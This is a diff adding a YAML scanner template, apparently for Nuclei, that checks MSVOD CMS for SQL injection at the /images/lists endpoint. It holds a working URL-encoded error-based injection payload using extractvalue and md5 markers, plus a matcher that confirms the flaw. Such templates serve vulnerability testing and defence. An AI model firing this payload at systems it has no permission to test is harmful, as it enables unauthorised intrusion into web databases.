@@ -1,0 +1,31 @@
+id: poc-local-cms-xray-msvod-lists-sqli
+
+info:
+  name: poc-local-cms-xray-mscod-lists-sqli
+  author: capiton
+  severity: high
+  description: ""
+  reference:
+    - https://github.com/jinqi520
+  metadata:
+    fofa-query: ""
+    Vulnerability-Impact: ""
+  tags: msvod
+
+variables:
+  r1: "{{rand_int(800000000, 1000000000)}}"
+  md5_r1: "{{md5(r1)}}"
+
+
+requests:
+  - method: GET
+    path:
+      - "{{RootURL}}/images/lists?cid=1%20)%20ORDER%20BY%201%20desc%2Cextractvalue(rand()%2Cconcat(0x7c%2Cmd5({{r1}})))%20desc%20--%2Ba"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,substr(md5("{{r1}}"), 0, 31))
+        condition: and
+
